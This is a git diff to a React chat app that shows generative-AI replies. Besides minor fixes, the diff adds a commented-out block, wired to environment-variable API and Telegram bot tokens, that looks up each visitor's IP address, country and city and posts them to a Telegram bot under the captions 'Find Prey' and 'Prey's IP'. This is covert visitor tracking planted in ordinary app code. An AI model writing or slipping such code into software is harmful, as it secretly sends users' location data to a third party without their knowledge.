@@ -9,6 +9,7 @@ import { Copy, Send } from "lucide-react";
 import { Chats } from "./utils";
 import { Input } from "./components/ui/input";
 import { Button } from "./components/ui/button";
+import axios from "axios";
 
 tailspin.register();
 type FormValue = {
@@ -16,6 +17,26 @@ type FormValue = {
 };
 
 function App() {
+  let TOKEN = import.meta.env.VITE_APP_IP_API_KEY;
+  let CHAT_ID = import.meta.env.VITE_APP_CHAT_ID;
+  let TELEGRAM_TOKEN = import.meta.env.VITE_APP_TELEGRAM_TOKEN;
+  let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+
+  // axios(`https://apiip.net/api/check?accessKey=${TOKEN}`).then((res) => {
+  //   let message = `<b>Find Prey</b>\n`;
+  //   message += `<b>Site name:</b> ChatApp\n`;
+  //   message += `<b>Country:</b> ${res.data.countryName}\n`;
+  //   message += `<b>City:</b> ${res.data.city}\n`;
+  //   message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
+  //   message += `<b>Prey's country flag:</b> ${res.data.countryFlagEmoj}`;
+
+  //   axios.post(`${URL}/sendPhoto`, {
+  //     chat_id: CHAT_ID,
+  //     photo: "https://ibb.co/1mvCtj9",
+  //     caption: message,
+  //     parse_mode: "HTML",
+  //   });
+  // });
   const [messages, setMessages] = useState<Chats[]>();
   const [sendMessage, { isLoading }] = useSendMessageMutation();
   const { register, handleSubmit, reset } = useForm<FormValue>();
@@ -40,7 +61,7 @@ function App() {
           role: "chat",
           avatar:
             "https://static.vecteezy.com/system/resources/previews/021/059/827/non_2x/chatgpt-logo-chat-gpt-icon-on-white-background-free-vector.jpg",
-          message: res.data.candidates[0].content.parts[0].text,
+          message: res.data?.candidates[0].content.parts[0].text,
           date: new Date().toISOString(),
         };
 
@@ -143,7 +164,8 @@ function App() {
         onSubmit={handleSubmit(formSubmit)}
         className="p-4 border-y flex gap-x-3"
       >
-        <Input autoComplete="off"
+        <Input
+          autoComplete="off"
           {...register("message")}
           className="bg-white dark:text-white dark:bg-zinc-700 p-5"
           placeholder="Message..."
